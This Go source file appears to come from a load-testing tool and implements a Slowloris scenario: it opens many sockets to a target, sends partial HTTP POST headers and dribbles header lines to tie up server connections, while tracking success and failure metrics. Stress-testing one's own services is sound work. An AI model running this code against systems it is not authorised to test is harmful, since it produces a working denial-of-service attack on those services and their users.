package scenarios

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// RunSlowlorisHold pins kernel socket receive buffers and tests epoll worker starvation
func RunSlowlorisHold(ctx context.Context, target string, activeSockets int, holdDuration time.Duration) Summary {
	tracker := NewMetricTracker()

	hostPort := strings.TrimPrefix(target, "http://")
	hostPort = strings.TrimPrefix(hostPort, "https://")
	if !strings.Contains(hostPort, ":") {
		hostPort += ":80"
	}

	fmt.Printf("[SLOWLORIS] Target: %s | Sockets: %d | Hold Duration: %v\n", hostPort, activeSockets, holdDuration)
	fmt.Printf("[SLOWLORIS] Dribbling partial headers to pin kernel socket rcvbuf and induce epoll churn\n")

	var wg sync.WaitGroup
	deadline := time.Now().Add(holdDuration)

	for i := 0; i < activeSockets; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			d := net.Dialer{
				Timeout: 5 * time.Second,
			}

			conn, err := d.DialContext(ctx, "tcp", hostPort)
			if err != nil {
				tracker.RecordFailure(categorizeError(err))
				return
			}
			defer conn.Close()

			start := time.Now()
			// Send incomplete initial header
			_, err = conn.Write([]byte(fmt.Sprintf("POST /leak HTTP/1.1\r\nHost: localhost\r\nUser-Agent: ephemeral-slowloris/%d\r\nContent-Length: 100000\r\n", id)))
			if err != nil {
				tracker.RecordFailure("write_initial_error")
				return
			}

			// Dribble 1 header line every 800ms
			ticker := time.NewTicker(800 * time.Millisecond)
			defer ticker.Stop()

			step := 0
			for time.Now().Before(deadline) {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					step++
					line := fmt.Sprintf("X-Dribble-%d: %d\r\n", id, step)
					_, err := conn.Write([]byte(line))
					if err != nil {
						tracker.RecordFailure("socket_dribble_broken")
						return
					}
					tracker.RecordSuccess(time.Since(start))
				}
			}
		}(i)

		// Stagger connection ramp-up slightly
		if i%100 == 0 {
			time.Sleep(5 * time.Millisecond)
		}
	}

	wg.Wait()
	return tracker.Snapshot()
}
